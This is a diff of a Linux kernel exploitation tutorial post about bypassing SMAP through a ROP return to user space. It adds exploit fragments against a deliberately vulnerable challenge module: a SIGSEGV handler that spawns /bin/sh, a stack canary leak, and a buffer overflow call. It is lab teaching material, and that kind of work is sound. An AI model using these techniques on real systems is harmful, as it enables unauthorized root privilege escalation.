@@ -8,7 +8,6 @@ linktitle = ""
 title = "Linux Kernel 0x03 :: Bypass SMAP with SIGSEGV Handler"
 slug = "linux-kernel-3-bypass-smep"
 type = "post"
-draft = true
 +++
 
 ## Table of Contents
@@ -18,6 +17,7 @@ draft = true
  4. [Building a Complete Escalation Chain](#building-a-complete-escalation-chain)
  5. [Environment Setup](#environment-setup)
  6. [Building the Exploit](#building-the-exploit) 
+ 7. [Fixing the Exploit with a SIGSEGV Handler](#fixing-the-exploit-with-a-sigsegv-handler)
 
 
 ## Overview of Supervisor Mode Access Prevention
@@ -31,7 +31,10 @@ As we cannot read or write user-space memory, we'll have to find a different way
 ## SMAP Bypass Techniques
 Unlike SMEP, there isn't a straight-forward way to simply bypass SMAP. Instead, we'll have to craft a full exploit chain that replicates the return to user-space process. This way we'll be able to return to user-space and execute arbitrary code with elevated privileges.
 
-...
+Here are the steps we need to take in order to return to user-space via ROP chain:
+ - Execute a `swapgs` instruction to swap the ensure the GS register corresponds to user-space.
+ - Execute an `iret` instruction to restore our user-space registers.
+ - Ensure that our `iret` frame is positioned correctly at the top of the stack.
 
 
 ## A Vulnerable Kernel Module
@@ -108,5 +111,42 @@ void cleanup_module(void)
 ...
 
 
+## Fixing the Exploit with a SIGSEGV Handler
+...
+
+```c
+void signal_handler(int signum)
+{
+    system("/bin/sh");
+}
+```
+
+...
+
+```c
+int main(int argc, char **argv)
+{
+    save_user_space();
+
+    /* register signal handler */
+    signal(SIGSEGV, signal_handler);
+
+    int fd = open("/proc/challenge", O_RDWR);
+    assert(fd > 0);
+
+    /* leak stack canary */
+    unsigned long canary = leak_canary(fd);
+    printf("[*] canary @ 0x%lx\n", canary);
+
+    overflow_buffer(fd, canary); 
+
+    return 0;
+}
+```
+
+...
+
+
 ## Appendix
  - [Learning Linux Kernel Exploitation - Part 2](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/)
+ - [KSMASH - Kernel Stack Smashing](https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/)
